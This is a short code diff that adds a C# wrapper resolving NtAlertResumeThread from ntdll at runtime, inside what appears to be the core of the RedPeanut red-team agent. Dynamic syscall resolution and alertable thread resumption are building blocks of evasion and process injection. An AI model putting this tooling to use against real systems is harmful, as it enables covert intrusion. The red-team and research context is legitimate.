@@ -909,6 +909,13 @@ namespace RedPeanutAgent.Core
 
         }
 
+        public static int ZwAlertResumeThread(IntPtr hThread, out ulong PreviousSuspendCount)
+        {
+            IntPtr proc = GetProcAddress(GetNtDll(), "NtAlertResumeThread");
+            NativeSysCall.Delegates.ZwAlertResumeThread ZwAlertResumeThread = (NativeSysCall.Delegates.ZwAlertResumeThread)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.ZwAlertResumeThread));
+            return ZwAlertResumeThread( hThread, out PreviousSuspendCount);
+        }
+
         public static int ZwQueryWnfStateData(ref ulong StateId, [In, Optional] WnfType TypeId, [Optional] IntPtr Scope, out int Changestamp, SafeBuffer DataBuffer, ref int DataBufferSize)
         {
             IntPtr proc = GetProcAddress(GetNtDll(), "ZwQueryWnfStateData");
